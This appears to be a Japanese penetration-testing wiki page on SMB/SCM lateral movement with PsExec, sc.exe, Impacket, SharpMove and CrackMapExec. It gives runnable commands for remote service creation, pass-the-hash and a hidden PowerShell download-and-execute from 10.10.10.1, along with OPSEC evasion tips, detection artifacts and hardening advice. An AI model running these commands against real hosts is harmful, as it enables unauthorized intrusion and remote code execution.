# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## どのように動作するか

これらの technique は、SMB/RPC 経由で Windows Service Control Manager (SCM) をリモートから悪用し、ターゲットホスト上でコマンドを実行します。一般的な流れは次のとおりです。

1. ターゲットに認証し、SMB (TCP/445) 経由で ADMIN$ share にアクセスする。
2. 実行させる実行ファイルをコピーするか、サービスが実行する LOLBAS コマンドラインを指定する。
3. SCM (MS-SCMR over \PIPE\svcctl) 経由で、指定したコマンドまたはバイナリを指すサービスをリモートで作成する。
4. サービスを開始して payload を実行し、必要に応じて named pipe 経由で stdin/stdout を取得する。
5. サービスを停止し、後片付けを行う（サービスと、配置したバイナリを削除する）。

必要条件/前提条件:
- ターゲット上の Local Administrator (SeCreateServicePrivilege)、またはターゲット上で明示的なサービス作成権限があること。
- SMB (445) に到達可能で、ADMIN$ share が利用できること。また、ホストの firewall で Remote Service Management が許可されていること。
- UAC Remote Restrictions: ローカルアカウントでは、組み込みの Administrator を使うか LocalAccountTokenFilterPolicy=1 に設定しない限り、token filtering によってネットワーク経由の管理者アクセスがブロックされることがある。
- Kerberos と NTLM: hostname/FQDN を使うと Kerberos が有効になり、IP で接続すると NTLM にフォールバックすることが多い（セキュリティ強化された環境ではブロックされる場合がある）。

### sc.exe を使った手動の ScExec/WinExec

以下は、最小限のサービス作成方法を示しています。サービスイメージには、配置した EXE、または cmd.exe や powershell.exe のような LOLBAS を指定できます。

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

メモ:
- サービスではない EXE を起動するとタイムアウトエラーが発生することがありますが、実行自体は行われます。
- OPSEC の観点からより安全にするには、fileless コマンド（cmd /c、powershell -enc）を優先するか、ドロップした痕跡を削除してください。

詳細な手順はこちら: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## ツールと使用例

### Sysinternals PsExec.exe

- SMB を使って ADMIN$ に PSEXESVC.exe を配置し、一時サービス（デフォルト名は PSEXESVC）をインストールして、named pipe 経由で I/O を中継する、従来からある管理ツールです。
- 使用例:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- WebDAV 経由で Sysinternals Live から直接起動できます:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- サービスのインストール／アンインストールイベントが残ります（サービス名は、-r を使わない限り通常 PSEXESVC）。実行中に C:\Windows\PSEXESVC.exe が作成されます。

### Impacket psexec.py (PsExec-like)

- RemComに似たサービスを埋め込んで使用します。一時的なサービスバイナリ（通常はランダムな名前）を ADMIN$ 経由で配置し、サービス（デフォルトは通常 RemComSvc）を作成して、名前付きパイプ経由で I/O を中継します。

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

痕跡
- C:\Windows\ に一時的な EXE（ランダムな8文字）を作成します。サービス名は、変更しない限り RemComSvc です。

### Impacket smbexec.py (SMBExec)

- cmd.exe を起動する一時的なサービスを作成し、I/O に名前付きパイプを使用します。通常、完全な EXE ペイロードの配置を避けます。コマンド実行はセミインタラクティブです。

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) は、サービスベースのexecを含む複数の横展開手法を実装しています。

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) には、リモートでコマンドを実行するためのサービスの変更・作成機能が含まれています。

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- CrackMapExec を使用して、異なるバックエンド（psexec/smbexec/wmiexec）経由で実行することもできます。

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC、検知、アーティファクト

PsExec-like techniques の使用時に典型的なホスト／ネットワークアーティファクト:
- ターゲットで、使用した管理者アカウントに対する Security 4624（Logon Type 3）および 4672（Special Privileges）。
- Security 5140/5145 File Share および File Share Detailed イベントに、ADMIN$ へのアクセスやサービスバイナリ（例: PSEXESVC.exe、またはランダムな8文字の .exe）の作成／書き込みが記録される。
- ターゲットでのサービスインストールを示す、Service Control Manager による **System** 7045: PSEXESVC、RemComSvc、またはカスタム名（`-r` / `-service-name`）など。これはサービスがインストールされたことを証明するもので、イメージが実行されたことを示すものではありません。タイムスタンプとイメージパスを、プロセスイベント、または該当するサービスイメージの Prefetch エントリ（利用可能な場合）と照合してください。<sup>[[4]](#references)</sup>
- Sysmon 1（Process Create）での services.exe またはサービスイメージ、3（Network Connect）、C:\Windows\ 内の 11（File Create）、\\.\pipe\psexesvc、\\.\pipe\remcom_* などのパイプ、またはランダム化された同等のパイプに対する 17/18（Pipe Created/Connected）。
- Sysinternals EULA のレジストリアーティファクト: オペレーターのホスト上の HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1（抑制されていない場合）。

ハンティングの着眼点
- ImagePath に cmd.exe /c、powershell.exe、または TEMP の場所が含まれるサービスインストールに対してアラートを設定する。
- ParentImage が C:\Windows\PSEXESVC.exe であるプロセスの作成、または services.exe の子プロセスとして LOCAL SYSTEM で実行されるシェルを探す。
- -stdin/-stdout/-stderr で終わる名前付きパイプや、既知の PsExec clone のパイプ名を検知する。

## よくある問題のトラブルシューティング
- サービス作成時の Access is denied (5): 実際にはローカル管理者ではない、ローカルアカウントに対する UAC のリモート制限、またはサービスバイナリのパスに対する EDR の改ざん防止機能が原因です。
- ネットワークパスが見つからない（53）、または ADMIN$ に接続できない: ファイアウォールによる SMB/RPC のブロック、または管理共有の無効化が原因です。
- Kerberos は失敗するが NTLM はブロックされる: IP ではなくホスト名/FQDN で接続し、適切な SPN を設定するか、Impacket の使用時にチケットとともに -k/-no-pass を指定してください。
- サービスの起動がタイムアウトしても payload は実行された: 実際のサービスバイナリではない場合は想定どおりです。出力をファイルに保存するか、ライブ I/O には smbexec を使用してください。

## ハードニングに関する注意事項
- Windows 11 24H2 および Windows Server 2025 では、デフォルトで送信接続（Windows 11 では受信接続も）の SMB signing が必須です。有効な認証情報を用いた正規の PsExec の使用には影響しませんが、署名されていない SMB relay の悪用を防ぎ、署名をサポートしないデバイスに影響する可能性があります。<sup>[[2]](#references)</sup>
- 新しい SMB client NTLM blocking（Windows 11 24H2/Server 2025）により、IP アドレスや Kerberos 非対応サーバーへの接続時に NTLM へのフォールバックが防止される場合があります。ハードニングされた環境では、NTLM ベースの PsExec/SMBExec が動作しなくなります。Kerberos（ホスト名/FQDN）を使用するか、正当な必要がある場合は例外を設定してください。<sup>[[2]](#references)</sup>
- 最小権限の原則: ローカル管理者グループのメンバーを最小限にし、Just-in-Time/Just-Enough Admin を優先し、LAPS を適用して、7045 サービスインストールを監視／アラートする。

## 関連項目

- WMI ベースのリモート実行（ファイルレスであることが多い）:

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM ベースのリモート実行:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 と Windows 11 における SMB セキュリティのハードニング](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [認証情報を使って Windows マシンを掌握する - パート2（PSExec とサービス）](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – システムイベントログを使用した予期しない再起動のトラブルシューティング](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
